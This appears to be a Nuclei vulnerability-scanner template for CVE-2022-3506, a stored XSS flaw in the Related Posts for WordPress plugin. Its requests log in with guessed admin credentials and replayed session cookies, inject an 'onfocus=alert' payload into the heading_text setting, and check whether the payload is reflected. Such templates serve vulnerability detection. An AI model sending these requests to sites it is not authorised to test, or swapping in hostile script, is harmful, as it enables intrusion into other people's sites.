id: CVE-2022-3506

info:
  name: WordPress Related Posts <= 2.1.2 - Cross-Site Scripting
  author: arafatansari
  severity: medium
  description: |
    The Related Posts for WordPress plugin is vulnerable to stored XSS, specifically in the rp4wp[heading_text] parameter because the user input is not properly sanitized, allowing the insertion of JavaScript code that can exploit the vulnerability.
  reference:
    - https://huntr.dev/bounties/08251542-88f6-4264-9074-a89984034828/
  tags: wordpress,xss,plugin,wpscan

requests:
  - raw: 
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
       
        log=admin&pwd=admin123&wp-submit=Log+In&redirect_to={{Host}}%2Fwp-admin%2F&testcookie=1

      - |
        POST /wp-admin/options.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: wordpress_af799bb8d843135ea8438550f9a8b4e6=admin%7C1669705235%7CIGJKEmOLs5jCz06lVDPuolfmVDQbZC0wXGuVBewRhuD%7C7d62cc61df0f73b280f28510a05879a270392b50a12068fd68c9e801853a0e10; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=en_US; wordpress_logged_in_af799bb8d843135ea8438550f9a8b4e6=admin%7C1669705235%7CIGJKEmOLs5jCz06lVDPuolfmVDQbZC0wXGuVBewRhuD%7Cb8be6e1450ea194a89ffd327ad1eabf1afbf5a57f9d9f462673f170bc05105f4; wp-settings-time-1=1669534288
        
        option_page=rp4wp&action=update&_wpnonce=c0d0936d93&_wp_http_referer=%2Fwp-admin%2Foptions-general.php%3Fpage%3Drp4wp&rp4wp%5Bautomatic_linking%5D=1&rp4wp%5Bautomatic_linking_post_amount%5D=3&rp4wp%5Bheading_text%5D=%22+autofocus+onfocus%3Dalert%28%2FXSS%2F%29%3E&rp4wp%5Bexcerpt_length%5D=15&rp4wp%5Bcss%5D=.rp4wp-related-posts+ul%7Bwidth%3A100%25%3Bpadding%3A0%3Bmargin%3A0%3Bfloat%3Aleft%3B%7D%0D%0A.rp4wp-related-posts+ul%3Eli%7Blist-style%3Anone%3Bpadding%3A0%3Bmargin%3A0%3Bpadding-bottom%3A20px%3Bclear%3Aboth%3B%7D%0D%0A.rp4wp-related-posts+ul%3Eli%3Ep%7Bmargin%3A0%3Bpadding%3A0%3B%7D%0D%0A.rp4wp-related-post-image%7Bwidth%3A35%25%3Bpadding-right%3A25px%3B-moz-box-sizing%3Aborder-box%3B-webkit-box-sizing%3Aborder-box%3Bbox-sizing%3Aborder-box%3Bfloat%3Aleft%3B%7D

      - |
        GET /wp-admin/options-general.php?page=rp4wp&settings-updated=true HTTP/1.1
        Host: {{Hostname}}

    cookie-reuse: true
    redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'autofocus onfocus=alert(/XSS/)>'

      - type: status
        status:
          - 200
